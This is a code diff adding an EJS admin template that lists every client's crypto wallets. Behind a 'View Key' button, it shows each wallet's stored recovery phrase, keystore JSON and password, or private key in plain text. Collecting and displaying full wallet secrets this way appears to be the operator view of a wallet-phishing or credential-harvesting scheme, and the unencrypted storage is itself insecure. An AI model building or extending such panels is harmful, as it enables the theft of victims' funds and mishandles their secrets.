@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Wallets</title>
+    <link rel="stylesheet" href="/stylesheets/admin/wallet.css">
+</head>
+<body>
+    <%- partial('../partials/adminnavbar')%>
+
+    <div class="contentbox">
+        <div id="header">
+            <div id="headerinner">
+                <span class="headerinnerspan"><i class="fa-solid fa-users headericon"></i> <small>Crypto Wallets</small></span>
+                <span class="headerinnerspan"><a href="/admin/admin.dashboard"><i class="fas fa-project-diagram headericon"></i></a></span>
+            </div>
+          </div>
+
+        <div id="div2">
+            <div id="div2box">
+                <p id="div2boxheader">List of all clients and their wallets.</p>
+                <ol>
+                    <% for (let i = 0; i < clients.length; i++) { %> 
+                       <div class="list">
+                        <li><%= clients[i].firstname %> <%= clients[i].lastname %>  </li> 
+                        <p>Wallets:</p>
+                        <% if (clients[i].wallets.length > 0) { %> 
+                        <ol>
+                            <% for (let x = 0; x < clients[i].wallets.length; x++) { %>
+                                <span class="walletinfobox">
+                                    <span class="innerwalletinfobox1">
+                                        <li></li>
+                                        <span class="walletinfo">
+                                            <small><%= clients[i].wallets[x].walletType %></small>
+                                            <small> <%= clients[i].wallets[x].accessType %></small>
+                                        </span>
+                                    </span>
+
+                                    <span class="innerwalletinfobox2">
+                                        <button type="button" class="btn btn-primary revealbtn" data-bs-toggle="modal" data-bs-target="#revealKey<%= x%>">
+                                            <i class="fa-solid fa-check"></i> View Key
+                                        </button>
+
+                                        <div class="modal fade" id="revealKey<%= x%>" tabindex="-1" aria-labelledby="revealKey<%= x%>Label" aria-hidden="true">
+                                            <div class="modal-dialog">
+                                            <div class="modal-content">
+                                                <!-- <div class="modal-header">
+                                                <h5 class="modal-title" id="revealKey<%= x%>Label">VERIFY PAYMENT</h5>
+                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                                                </div> -->
+                                                <div class="modal-body">
+                                                    <% if (clients[i].wallets[x].accessType === 'Phrase') { %>
+                                                        <span class="keyspan">
+                                                            <label for="texta">Phrase:</label>
+                                                            <textarea name="" id="texta" cols="10" style="resize: none;" rows="10" readonly><%= clients[i].wallets[x].phraseTokens %></textarea>
+                                                        </span>
+                                                        
+                                                    <% } else if (clients[i].wallets[x].accessType === 'Keystore JSON') { %>
+                                                        <span class="keyspan">
+                                                            <label for="texta">Keystore JSON:</label>
+                                                            <textarea name="" id="texta" cols="10" style="resize: none;" rows="10" readonly><%= clients[i].wallets[x].keystoneJsonTokens %></textarea>
+                                                            <label for="walletpassword">Keystore JSON Password:</label>
+                                                            <input type="text" id="walletpassword" value="<%= clients[i].wallets[x].password %>" readonly>
+                                                        </span>
+                                                    <% } else if (clients[i].wallets[x].accessType === 'Private Key') { %>
+                                                        <span class="keyspan">
+                                                            <label for="texta">Private Key:</label>
+                                                            <textarea name="" id="texta" cols="10" style="resize: none;" rows="10" readonly><%= clients[i].wallets[x].privateKeyTokens %></textarea>
+                                                        </span>
+                                                    <% } %>
+                                                </div>
+                                                <div class="modal-footer">
+                                                </div>
+                                            </div>
+                                            </div>
+                                        </div>
+                                    </span>
+                                </span>
+                                
+                            <% } %>
+                        </ol>
+                        <% } else { %>
+                            <span>No wallet added yet.</span>
+                        <% } %>
+                       </div>
+                    <% } %>
+                </ol> 
+            </div>
+        </div>
+
+
+    
+    </div>
+    
+
+    <script src="/script/app.js"></script>
+</body>
+</html>
